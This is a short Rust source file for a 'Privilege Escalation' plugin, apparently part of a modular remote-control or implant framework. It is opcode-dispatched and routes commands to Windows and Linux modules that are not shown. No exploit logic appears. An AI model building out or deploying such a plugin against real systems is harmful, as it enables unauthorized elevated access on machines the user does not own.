use plugin_api::HostContext;

#[cfg(windows)]
mod windows;
#[cfg(target_os = "linux")]
mod linux;

mod common;

pub struct PrivEscPlugin;

impl PrivEscPlugin {
    pub fn new() -> Self { Self }
    pub fn opcode(&self) -> u8 { 0x05 }

    pub fn execute(&self, cmd: &[u8], _ctx: &HostContext) -> Result<(), String> {
        #[cfg(windows)]
        { return windows::execute(cmd); }

        #[cfg(target_os = "linux")]
        { return linux::execute(cmd); }

        #[cfg(not(any(windows, target_os = "linux")))]
        { Err("Unsupported OS".into()) }
    }
}

plugin_api::declare_plugin!(PrivEscPlugin, "Privilege Escalation");
